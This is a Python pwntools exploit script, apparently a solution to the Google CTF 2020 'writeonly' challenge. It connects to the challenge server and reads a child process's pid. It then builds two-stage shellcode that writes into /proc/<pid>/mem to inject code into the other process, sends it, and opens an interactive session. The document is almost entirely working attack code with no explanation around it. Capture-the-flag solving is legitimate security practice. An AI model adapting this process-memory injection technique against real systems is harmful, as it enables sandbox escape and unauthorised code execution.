from pwn import *
import subprocess
import re


# context.log_level = 'DEBUG'
# io = process('./chal')
io = remote('writeonly.2020.ctfcompetition.com', 1337)

io.recvuntil(b'pid: ')
data = io.recvline().rstrip()
pid = int(data)

subprocess.Popen("nasm -f elf64 stage2.asm && gcc -nostdlib -o stage2 stage2.o && objcopy stage2.o /dev/null --dump-section .text=stage2.bin", shell=True)

with open("./stage2.bin", "rb") as f:
    payload = f.read()
data = ""
for b in payload:
    data += hex(b) + ", "
length = len(payload)

with open("./stage1.asm", "r") as f:
    asm = f.read()
asm = re.sub("/proc/\\d+/mem", "/proc/{}/mem".format(pid), asm)
asm = re.sub("stage2: db .*$", "stage2: db {}".format(data), asm)
print(asm)
with open("./stage1.asm", "w") as f:
    f.write(asm)

subprocess.Popen("nasm -f elf64 stage1.asm && gcc -nostdlib -o stage1 stage1.o && objcopy stage1.o /dev/null --dump-section .text=stage1.bin", shell=True)

with open('./stage1.bin', 'rb') as f:
    shellcode = f.read()

print("pid: {}".format(pid))
# print("Press enter to continue...")
# input()
io.recvuntil('shellcode length?')
io.sendline(b'%d' % len(shellcode))
io.recvuntil(b'of shellcode.')
io.send(shellcode)

io.interactive()
